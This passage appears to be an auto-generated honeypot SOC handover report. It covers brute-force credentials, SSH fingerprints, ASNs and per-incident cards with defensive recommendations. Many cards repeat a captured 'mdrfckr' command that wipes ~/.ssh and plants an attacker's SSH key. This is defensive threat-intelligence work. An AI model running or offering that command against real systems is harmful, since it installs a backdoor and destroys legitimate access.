# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-23 |
| **Generated At** | 2026-04-23T22:52:36Z |
| **Shift Time** | 22:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **144** |
| Confirmed Threats | **142** |
| False Positives Filtered | **2** (1.4%) |
| Unique Attacker IPs | **7** |
| Countries of Origin | **5** |
| High Severity Cases | **61** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **140** |
| Unique Credential Pairs | **30** |
| Unique Usernames | **15** |
| Unique Passwords | **30** |
| Successful Auth Pairs | **34** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 61 |
| `345gs5662d34` | 30 |
| `admin` | 9 |
| `ubuntu` | 9 |
| `user0` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 30 |
| `3245gs5662d34` | 30 |
| `password` | 3 |
| `Root2022@@` | 3 |
| `Qazwsx111111#` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 30 |
| `root` | `3245gs5662d34` | 30 |
| `user0` | `password` | 3 |
| `root` | `Root2022@@` | 3 |
| `root` | `Qazwsx111111#` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Root2022@@` | `185.103.202.193` | 2026-04-23T21:02:04 |
| `root` | `3245gs5662d34` | `185.103.202.193` | 2026-04-23T21:02:09 |
| `root` | `Qazwsx111111#` | `185.103.202.193` | 2026-04-23T21:03:04 |
| `root` | `Yy123456@` | `185.103.202.193` | 2026-04-23T21:09:30 |
| `root` | `qqXX123123` | `185.103.202.193` | 2026-04-23T21:11:14 |
| `root` | `Zxcv@123` | `185.103.202.193` | 2026-04-23T21:12:09 |
| `root` | `Qazwsx111111#` | `103.31.38.83` | 2026-04-23T21:12:43 |
| `root` | `3245gs5662d34` | `103.31.38.83` | 2026-04-23T21:12:49 |
| `root` | `1qaz!QAZ2wsx` | `103.31.38.83` | 2026-04-23T21:14:11 |
| `root` | `nPSpP4PBW0` | `185.103.202.193` | 2026-04-23T21:15:51 |
| `root` | `Aa112211.` | `185.103.202.193` | 2026-04-23T21:16:46 |
| `root` | `nPSpP4PBW0` | `103.31.38.83` | 2026-04-23T21:17:03 |
| `root` | `Aa112211.` | `103.31.38.83` | 2026-04-23T21:18:30 |
| `root` | `Qazwsx12` | `103.31.38.83` | 2026-04-23T21:19:58 |
| `root` | `1qaz!QAZ2wsx` | `185.103.202.193` | 2026-04-23T21:21:21 |
| `root` | `Ee123456` | `185.103.202.193` | 2026-04-23T21:22:13 |
| `root` | `Qazwsx12` | `185.103.202.193` | 2026-04-23T21:23:58 |
| `root` | `Ee123456` | `103.31.38.83` | 2026-04-23T21:34:33 |
| `root` | `Aa112211.` | `172.200.228.35` | 2026-04-23T21:34:57 |
| `root` | `3245gs5662d34` | `172.200.228.35` | 2026-04-23T21:35:02 |
| `root` | `P@ssw0rd` | `72.56.108.236` | 2026-04-23T21:37:09 |
| `root` | `Yy123456@` | `103.31.38.83` | 2026-04-23T21:37:32 |
| `root` | `Qazwsx111111#` | `172.200.228.35` | 2026-04-23T21:37:49 |
| `root` | `qqXX123123` | `103.31.38.83` | 2026-04-23T21:40:29 |
| `root` | `Zxcv@123` | `103.31.38.83` | 2026-04-23T21:43:23 |
| `root` | `nPSpP4PBW0` | `172.200.228.35` | 2026-04-23T21:43:53 |
| `root` | `Root2022@@` | `103.31.38.83` | 2026-04-23T21:44:50 |
| `root` | `Root2022@@` | `172.200.228.35` | 2026-04-23T21:44:58 |
| `root` | `Zxcv@123` | `172.200.228.35` | 2026-04-23T21:50:58 |
| `root` | `Qazwsx12` | `172.200.228.35` | 2026-04-23T21:53:58 |
| `root` | `1qaz!QAZ2wsx` | `172.200.228.35` | 2026-04-23T21:54:58 |
| `root` | `Ee123456` | `172.200.228.35` | 2026-04-23T21:55:57 |
| `root` | `Yy123456@` | `172.200.228.35` | 2026-04-23T21:58:00 |
| `root` | `qqXX123123` | `172.200.228.35` | 2026-04-23T21:59:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **144** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 139 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 139 | 3 |
| `16443846184e...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 139 | 3 | libssh-based |
| `16443846184e...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 30 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `185.103.202.193`, `172.200.228.35`, `103.31.38.83`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **7** |
| Unique ASNs | **5** |
| High-Risk ASNs | **4** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 3 | HIGH |
| `AS215710` | AS-hdmdigital-TR | 1 | HIGH |
| `AS210976` | Timeweb, LLP | 1 | HIGH |
| `AS3462` | Data Communication Business Group | 1 | MEDIUM |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (61)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0827870ad844

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:02 |
| **Last Seen** | 2026-04-23 21:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:02:04` | `cowrie.session.connect` |
| `2026-04-23 21:02:04` | `cowrie.client.version` |
| `2026-04-23 21:02:04` | `cowrie.client.kex` |
| `2026-04-23 21:02:04` | `cowrie.login.success` |
| `2026-04-23 21:02:05` | `cowrie.session.params` |
| `2026-04-23 21:02:05` | `cowrie.command.input` |
| `2026-04-23 21:02:05` | `cowrie.command.failed` |
| `2026-04-23 21:02:05` | `cowrie.log.closed` |
| `2026-04-23 21:02:05` | `cowrie.session.params` |
| `2026-04-23 21:02:05` | `cowrie.command.input` |
| `2026-04-23 21:02:06` | `cowrie.session.file_download` |
| `2026-04-23 21:02:06` | `cowrie.log.closed` |
| `2026-04-23 21:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4517673db23

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:02 |
| **Last Seen** | 2026-04-23 21:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:02:08` | `cowrie.session.connect` |
| `2026-04-23 21:02:08` | `cowrie.client.version` |
| `2026-04-23 21:02:08` | `cowrie.client.kex` |
| `2026-04-23 21:02:09` | `cowrie.login.success` |
| `2026-04-23 21:02:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-014773038f8b

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:03 |
| **Last Seen** | 2026-04-23 21:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:03:03` | `cowrie.session.connect` |
| `2026-04-23 21:03:03` | `cowrie.client.version` |
| `2026-04-23 21:03:04` | `cowrie.client.kex` |
| `2026-04-23 21:03:04` | `cowrie.login.success` |
| `2026-04-23 21:03:05` | `cowrie.session.params` |
| `2026-04-23 21:03:05` | `cowrie.command.input` |
| `2026-04-23 21:03:05` | `cowrie.command.failed` |
| `2026-04-23 21:03:05` | `cowrie.log.closed` |
| `2026-04-23 21:03:05` | `cowrie.session.params` |
| `2026-04-23 21:03:05` | `cowrie.command.input` |
| `2026-04-23 21:03:05` | `cowrie.session.file_download` |
| `2026-04-23 21:03:05` | `cowrie.log.closed` |
| `2026-04-23 21:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73381c9d6504

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:03 |
| **Last Seen** | 2026-04-23 21:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:03:08` | `cowrie.session.connect` |
| `2026-04-23 21:03:08` | `cowrie.client.version` |
| `2026-04-23 21:03:08` | `cowrie.client.kex` |
| `2026-04-23 21:03:09` | `cowrie.login.success` |
| `2026-04-23 21:03:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0024a90863b8

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:09 |
| **Last Seen** | 2026-04-23 21:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:09:30` | `cowrie.session.connect` |
| `2026-04-23 21:09:30` | `cowrie.client.version` |
| `2026-04-23 21:09:30` | `cowrie.client.kex` |
| `2026-04-23 21:09:30` | `cowrie.login.success` |
| `2026-04-23 21:09:31` | `cowrie.session.params` |
| `2026-04-23 21:09:31` | `cowrie.command.input` |
| `2026-04-23 21:09:31` | `cowrie.command.failed` |
| `2026-04-23 21:09:31` | `cowrie.log.closed` |
| `2026-04-23 21:09:31` | `cowrie.session.params` |
| `2026-04-23 21:09:31` | `cowrie.command.input` |
| `2026-04-23 21:09:32` | `cowrie.session.file_download` |
| `2026-04-23 21:09:32` | `cowrie.log.closed` |
| `2026-04-23 21:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8930a8c89c7b

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:09 |
| **Last Seen** | 2026-04-23 21:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:09:34` | `cowrie.session.connect` |
| `2026-04-23 21:09:34` | `cowrie.client.version` |
| `2026-04-23 21:09:34` | `cowrie.client.kex` |
| `2026-04-23 21:09:35` | `cowrie.login.success` |
| `2026-04-23 21:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0047b5b7ad63

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:11 |
| **Last Seen** | 2026-04-23 21:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:11:13` | `cowrie.session.connect` |
| `2026-04-23 21:11:13` | `cowrie.client.version` |
| `2026-04-23 21:11:13` | `cowrie.client.kex` |
| `2026-04-23 21:11:14` | `cowrie.login.success` |
| `2026-04-23 21:11:15` | `cowrie.session.params` |
| `2026-04-23 21:11:15` | `cowrie.command.input` |
| `2026-04-23 21:11:15` | `cowrie.command.failed` |
| `2026-04-23 21:11:15` | `cowrie.log.closed` |
| `2026-04-23 21:11:15` | `cowrie.session.params` |
| `2026-04-23 21:11:15` | `cowrie.command.input` |
| `2026-04-23 21:11:15` | `cowrie.session.file_download` |
| `2026-04-23 21:11:15` | `cowrie.log.closed` |
| `2026-04-23 21:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d4c98ab325

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:11 |
| **Last Seen** | 2026-04-23 21:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:11:18` | `cowrie.session.connect` |
| `2026-04-23 21:11:18` | `cowrie.client.version` |
| `2026-04-23 21:11:18` | `cowrie.client.kex` |
| `2026-04-23 21:11:19` | `cowrie.login.success` |
| `2026-04-23 21:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d226f9e0fa91

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:12 |
| **Last Seen** | 2026-04-23 21:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:12:08` | `cowrie.session.connect` |
| `2026-04-23 21:12:08` | `cowrie.client.version` |
| `2026-04-23 21:12:08` | `cowrie.client.kex` |
| `2026-04-23 21:12:09` | `cowrie.login.success` |
| `2026-04-23 21:12:09` | `cowrie.session.params` |
| `2026-04-23 21:12:09` | `cowrie.command.input` |
| `2026-04-23 21:12:09` | `cowrie.command.failed` |
| `2026-04-23 21:12:10` | `cowrie.log.closed` |
| `2026-04-23 21:12:10` | `cowrie.session.params` |
| `2026-04-23 21:12:10` | `cowrie.command.input` |
| `2026-04-23 21:12:10` | `cowrie.session.file_download` |
| `2026-04-23 21:12:10` | `cowrie.log.closed` |
| `2026-04-23 21:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53918367a80c

| Field | Detail |
|---|---|
| **Source IP** | `185.103.202[.]193` |
| **First Seen** | 2026-04-23 21:12 |
| **Last Seen** | 2026-04-23 21:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:12:13` | `cowrie.session.connect` |
| `2026-04-23 21:12:13` | `cowrie.client.version` |
| `2026-04-23 21:12:13` | `cowrie.client.kex` |
| `2026-04-23 21:12:14` | `cowrie.login.success` |
| `2026-04-23 21:12:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.103.202[.]193` to AbuseIPDB if not already reported
- [ ] Block `185.103.202[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f31152b54f9

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:12 |
| **Last Seen** | 2026-04-23 21:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:12:42` | `cowrie.session.connect` |
| `2026-04-23 21:12:42` | `cowrie.client.version` |
| `2026-04-23 21:12:43` | `cowrie.client.kex` |
| `2026-04-23 21:12:43` | `cowrie.login.success` |
| `2026-04-23 21:12:44` | `cowrie.session.params` |
| `2026-04-23 21:12:44` | `cowrie.command.input` |
| `2026-04-23 21:12:44` | `cowrie.command.failed` |
| `2026-04-23 21:12:44` | `cowrie.log.closed` |
| `2026-04-23 21:12:45` | `cowrie.session.params` |
| `2026-04-23 21:12:45` | `cowrie.command.input` |
| `2026-04-23 21:12:45` | `cowrie.session.file_download` |
| `2026-04-23 21:12:45` | `cowrie.log.closed` |
| `2026-04-23 21:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-280b0d3bdfdb

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:12 |
| **Last Seen** | 2026-04-23 21:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 21:12:48` | `cowrie.session.connect` |
| `2026-04-23 21:12:48` | `cowrie.client.version` |
| `2026-04-23 21:12:48` | `cowrie.client.kex` |
| `2026-04-23 21:12:49` | `cowrie.login.success` |
| `2026-04-23 21:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.38[.]83` to AbuseIPDB if not already reported
- [ ] Block `103.31.38[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81dea9876e80

| Field | Detail |
|---|---|
| **Source IP** | `103.31.38[.]83` |
| **First Seen** | 2026-04-23 21:14 |
| **Last Seen** | 2026-04-23 21:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
